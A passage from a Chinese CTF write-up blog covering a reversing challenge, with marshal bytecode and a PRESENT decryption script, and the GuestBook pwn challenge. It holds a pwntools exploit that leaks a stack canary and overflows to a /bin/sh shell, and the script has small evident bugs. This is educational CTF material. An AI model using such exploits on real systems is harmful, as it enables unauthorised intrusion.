05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\tr\x11\x00\x00\x00\xda\x05rangeZ\x08Sbox_invrH\x00\x00\x00Z\x08PBox_inv\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x10\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00\xda\x08&lt;module&gt;\x03\x00\x00\x00sl\x00\x00\x00$\x01\x12\x01 \x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\xfd\x04\x04\x12\x02\n\x01&#x27;</span></span><br><span class="line"><span class="comment"># 反编译字节码并写入文件</span></span><br><span class="line">source_code = uncompyle6.deparse_code(<span class="number">3.8</span>, marshal.loads(code))</span><br><span class="line"><span class="built_in">print</span>(source_code)</span><br><span class="line"><span class="comment"># l = marshal.loads(code)</span></span><br><span class="line"><span class="comment"># exec(l)</span></span><br><span class="line"><span class="comment"># dis.dis(l)</span></span><br><span class="line"><span class="comment"># # deserialized_data = pickle.loads(code)</span></span><br><span class="line"><span class="comment"># # exec (deserialized_data)</span></span><br></pre></td></tr></table></figure></div><p><strong>marshal模块</strong>官方的介绍是marshal模块包括了以二进制的格式读写python值的函数，<code>.pyc</code>文件的“伪编译”代码。与python的序列化和反序列化相关（不推荐），这里还提及到的是pickle模块。</p><p>题目中的是marshal.load()函数，它将二进制数据反序列化为python对象，<code>marshal.dump(value,file[,version])</code>序列化的函数，value表示待序列化的值，file表示打开的输出流</p></blockquote><p>回归正题，官方提供的WP详细地介绍了关于这道题的解法：</p><p>使用marshal 库加载字节码运行，反编译使用<code>dis.dis</code>，<code>exec()</code>函数动态执行代码。</p><blockquote><p><code>exec()</code>函数是动态执行字符串类型的代码，基本的语法<code>exec(object[, globals[, locals]])</code> 其中global和local都是可选参数，表示全局和局部变量，如果没有就是当前作用域的命名空间。</p></blockquote><p>从脚本看，<code>exec()</code>函数可使用<code>globals()</code>查看，程序输入错误会退出，可以在exec前定义exit()函数，并使用try执行exec防止退出</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">l = marshal.loads(code)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">exec</span> (l)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">globals</span>())</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/DASCTFxCBCTF2023-Study&Re.assets/example1.png"                      alt="Untitled 1"                ></p><p>输出的东西看不懂，直接百度其中一些特殊的函数名，是PRESENT算法，涉及另一个知识盲区。</p><blockquote><p>python的序列化和反序列化：序列化是把变量从内存中变成可存储或传输形式的过程，反序列化是将变量内容从序列化的对象重新读到内存的过程。就像使用TCP&#x2F;IP协议进行通信传输，只支持字节数组的传输，那在发送端要在传输之前要先进行序列化，将预传输的对象传化为字节的形式，接收端则需要将字节反序列化，转为原对象。</p><p>原因：程序运行变量是在内存中操作的，但内存无法永久的保存数据，执行完毕占有的内存空间就会回收，在退出程序之前需要将操作的数据保存在磁盘中，以便下次数据的读取。python中叫做pickling和unpickling</p></blockquote><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sBoxLayer_dec</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            output += Sbox_inv[( state &gt;&gt; (i*<span class="number">4</span>)) &amp; <span class="number">0xF</span>] &lt;&lt; (i*<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pLayer_dec</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            output += ((state &gt;&gt; i) &amp; <span class="number">0x01</span>) &lt;&lt; PBox_inv[i]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateRoundkeys80</span>(<span class="params">key,rounds</span>):</span><br><span class="line">    roundkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,rounds+<span class="number">1</span>,<span class="number">1</span>): </span><br><span class="line">            roundkeys.append(key &gt;&gt;<span class="number">16</span>)</span><br><span class="line">            key = ((key &amp; (<span class="number">2</span>**<span class="number">19</span>-<span class="number">1</span>)) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">            key = (Sbox[key &gt;&gt; <span class="number">76</span>] &lt;&lt; <span class="number">76</span>)+(key &amp; (<span class="number">2</span>**<span class="number">76</span>-<span class="number">1</span>))</span><br><span class="line">            key ^= (i &lt;&lt; <span class="number">15</span>)^(key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">    <span class="keyword">return</span> roundkeys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string2number</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([<span class="built_in">ord</span>(i[c])&lt;&lt;(<span class="number">8</span>*c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment">#        0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f</span></span><br><span class="line">Sbox= [<span class="number">0xc</span>,<span class="number">0x5</span>,<span class="number">0x6</span>,<span class="number">0xb</span>,<span class="number">0x9</span>,<span class="number">0x0</span>,<span class="number">0xa</span>,<span class="number">0xd</span>,<span class="number">0x3</span>,<span class="number">0xe</span>,<span class="number">0xf</span>,<span class="number">0x8</span>,<span class="number">0x4</span>,<span class="number">0x7</span>,<span class="number">0x1</span>,<span class="number">0x2</span>]</span><br><span class="line">Sbox_inv = [Sbox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">PBox = [<span class="number">0</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">1</span>,<span class="number">17</span>,<span class="number">33</span>,<span class="number">49</span>,<span class="number">2</span>,<span class="number">18</span>,<span class="number">34</span>,<span class="number">50</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">35</span>,<span class="number">51</span>,</span><br><span class="line">        <span class="number">4</span>,<span class="number">20</span>,<span class="number">36</span>,<span class="number">52</span>,<span class="number">5</span>,<span class="number">21</span>,<span class="number">37</span>,<span class="number">53</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">38</span>,<span class="number">54</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">39</span>,<span class="number">55</span>,</span><br><span class="line">        <span class="number">8</span>,<span class="number">24</span>,<span class="number">40</span>,<span class="number">56</span>,<span class="number">9</span>,<span class="number">25</span>,<span class="number">41</span>,<span class="number">57</span>,<span class="number">10</span>,<span class="number">26</span>,<span class="number">42</span>,<span class="number">58</span>,<span class="number">11</span>,<span class="number">27</span>,<span class="number">43</span>,<span class="number">59</span>,</span><br><span class="line">        <span class="number">12</span>,<span class="number">28</span>,<span class="number">44</span>,<span class="number">60</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">45</span>,<span class="number">61</span>,<span class="number">14</span>,<span class="number">30</span>,<span class="number">46</span>,<span class="number">62</span>,<span class="number">15</span>,<span class="number">31</span>,<span class="number">47</span>,<span class="number">63</span>]</span><br><span class="line">PBox_inv = [PBox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRoundKey</span>(<span class="params">state,roundkey</span>):</span><br><span class="line">    <span class="keyword">return</span> state ^ roundkey</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">blocks</span>):</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    roundkeys = generateRoundkeys80(<span class="number">85354531916197809168417</span>, rounds)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        state = block</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds-<span class="number">1</span>):</span><br><span class="line">                state = addRoundKey(state, roundkeys[-i-<span class="number">1</span>])</span><br><span class="line">                state = pLayer_dec(state)</span><br><span class="line">                state = sBoxLayer_dec(state)</span><br><span class="line">        decipher = addRoundKey(state, roundkeys[<span class="number">0</span>])</span><br><span class="line">        flag += <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(decipher&gt;&gt;(c*<span class="number">8</span>) &amp; <span class="number">0xff</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">cmps = [<span class="number">120617461261311902</span>, <span class="number">16357837616839286114</span>, <span class="number">312508749794633008</span>, <span class="number">1843701600916795272</span>]</span><br><span class="line">decrypt(cmps)</span><br></pre></td></tr></table></figure></div><hr><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="GuestBook"><a href="#GuestBook" class="headerlink" title="GuestBook"></a><strong><strong>GuestBook</strong></strong></h2><p>使用checksec看到了canary保护，查看一些技术文章，总觉得差一步。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>进入函数查看，最多只能输入四次，通过strcpy函数，从堆复制到栈上，输入的长度不限，存在栈溢出。由于使用strcpy函数，所以输入的数据中含有\x00字符就会被截断，要从栈后面往前覆盖，多次输入。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/DASCTFxCBCTF2023-Study&Re.assets/example2.png"                                     ></p><p>找到<code>system(&quot;/bin/sh&quot;)</code>返回地址，发现是先进行覆盖，同时payload要利用泄露的Canary不破坏栈上的Canary在利用第二次输入，将Canary的\x00字节通过strcpy复制时自动末尾补恢复Canary，触发ret2text来getshell</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/DASCTFxCBCTF2023-Study&Re.assets/example3.png"                      alt="Untitled 3"                ></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#日志级别设置为&#x27;debug&#x27;,架构设置&#x27;amd64&#x27;                                             </span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#确定代码为远程服务器运行</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28731</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#本地运行时与GDB一起，附加到目标进程，选择执行GDB中的命令</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p,a)</span><br><span class="line">        <span class="keyword">if</span> a==<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#从目标接收数据，找到字符串x</span></span><br><span class="line">ru=<span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line"><span class="comment">#发送一行字符串</span></span><br><span class="line">sl=<span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line"><span class="comment">#发送数据</span></span><br><span class="line">sd=<span class="keyword">lambda</span> x:p.send(x)</span><br><span class="line"><span class="comment">#接收数据a后发送数据b</span></span><br><span class="line">sa=<span class="keyword">lambda</span> a,b:p.sendafter(a,b)</span><br><span class="line"><span class="comment">#接收数据a后发送一行b</span></span><br><span class="line">sla=<span class="keyword">lambda</span> a,b:p.sendlineafter(a,b)</span><br><span class="line"><span class="comment">#与目标进程的交互式会话</span></span><br><span class="line">ia=<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line"><span class="comment">#定义leak_address()函数，从进程中泄露canary值，</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_address</span>():</span><br><span class="line">    <span class="keyword">if</span>(context.arch==<span class="string">&#x27;i386&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sa(<span class="string">&quot;Please input you name: &quot;</span>,<span class="string">&quot;A&quot;</span>*<span class="number">24</span>+<span class="string">&quot;:&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">canary = leak_canary()</span><br><span class="line">success(<span class="string">&quot;canary: &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;How many message would you like to leave(MAX 4):&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造payload</span></span><br><span class="line"><span class="comment">#(0xA0-8)达到堆栈上的返回地址+&quot;C&quot;字符+泄露的Canary值以7字节接收，省略末尾空字+&#x27;B&#x27;填充+地址</span></span><br><span class="line">payload = (<span class="number">0xA0</span>-<span class="number">8</span>)*<span class="string">&quot;A&quot;</span>+<span class="string">&quot;C&quot;</span>+p64(canary)[<span class="number">1</span>:]+<span class="number">8</span>*<span class="string">&quot;B&quot;</span>+<span class="string">&quot;\xC3\x12\x40&quot;</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造另一个payload，长度</span></span><br><span class="line">payload = (<span class="number">0xA0</span>-<span class="number">8</span>-<span class="number">32</span>*<span class="string">&quot;A&quot;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="Canary绕过"><a href="#Canary绕过" class="headerlink" title="Canary绕过"></a><strong>Canary绕过</strong></h3><p>首先介绍Canary：栈溢出是通过溢出存在在栈上的局部变量，让多出来的数据覆盖ebp、eip等，从而达到劫持控制流的目的。栈溢出保护，缓冲区溢出攻击缓解手段，覆盖栈上的返回地址执行shellcode。</p><p>启用站保护，函数执行时会在栈的尾部插入cookie值，函数返回时检测cookie值是否合法（在栈桢销毁前测试值是否被改变：攻击在覆盖返回地址是会将cookie值给覆盖掉），不合法就直接停止程序运行，组织了shellcode的执行，避免漏洞执行。在 Linux 中将 cookie 信息称为 Canary。就本题中的汇编来看，类似这样的标识符。</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004012D2                               ; __unwind &#123;</span><br><span class="line">.text:00000000004012D2 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:00000000004012D6 55                            push    rbp</span><br><span class="line">.text:00000000004012D7 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:00000000004012DA 48 81 EC A0 00 00 00          sub     rsp, 0A0h</span><br><span class="line">.text:00000000004012E1 64 48 8B 04 25 28 00 00 00    mov     rax, fs:28h</span><br><span class="line">;在启用canary编译后，函数会取fs寄存器0x28处的值，</span><br><span class="line">.text:00000000004012EA 48 89 45 F8                   mov     [rbp+var_8], rax</span><br><span class="line">;存放在栈中[rbp+var_8]的位置，操作即为栈中插入canary</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.text:0000000000401470 48 8B 45 F8                   mov     rax, [rbp+var_8] </span><br><span class="line">;函数返回之前，将变量交给rax</span><br><span class="line">.text:0000000000401474 64 48 33 04 25 28 00 00 00    xor     rax, fs:28h </span><br><span class="line">;比较fs寄存器0x28处的值和原本的存储异或判断canary是否被修改 相等即rax=0</span><br><span class="line">.text:000000000040147D 74 05                         jz      short locret_401484  </span><br><span class="line">;结果是0不跳转 </span><br><span class="line">.text:000000000040147D</span><br><span class="line">.text:000000000040147F E8 6C FC FF FF                call    ___stack_chk_fail    </span><br><span class="line">;不是0则执行call调用程序崩溃函数</span><br></pre></td></tr></table></figure></div><p>canary设计以字节<code>\x00</code>结尾，为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。</p><p>后续再做一些这样的题目来熟悉。</p><h2 id="EASYBOX"><a href="#EASYBOX" class="headerlink" 